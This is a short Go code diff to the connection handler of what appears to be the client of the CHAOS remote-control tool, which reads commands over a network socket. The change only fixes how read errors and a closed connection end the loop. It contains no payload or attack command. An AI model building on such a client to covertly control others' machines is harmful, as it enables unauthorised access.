@@ -7,6 +7,7 @@ import (
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
 	"github.com/tiagorlampert/CHAOS/client/app/util"
+	"io"
 	"net"
 	"strings"
 )
@@ -42,8 +43,13 @@ func (c ConnectionHandler) Handle() error {
 	for {
 		message, err := bufio.NewReader(c.Connection).ReadString('\n')
 		if err != nil {
-			log.WithField("cause", err.Error()).Error("error reading from connection")
-			continue
+			switch err {
+			case io.EOF:
+				log.Warnln("client closed the connection by terminating the process")
+			default:
+				log.WithField("cause", err.Error()).Error("error reading from connection")
+			}
+			break
 		}
 
 		switch strings.TrimSpace(message) {
@@ -59,6 +65,7 @@ func (c ConnectionHandler) Handle() error {
 			c.EncodeAndSend(response)
 		}
 	}
+	return nil
 }
 
 func (c ConnectionHandler) EncodeAndSend(data []byte) {
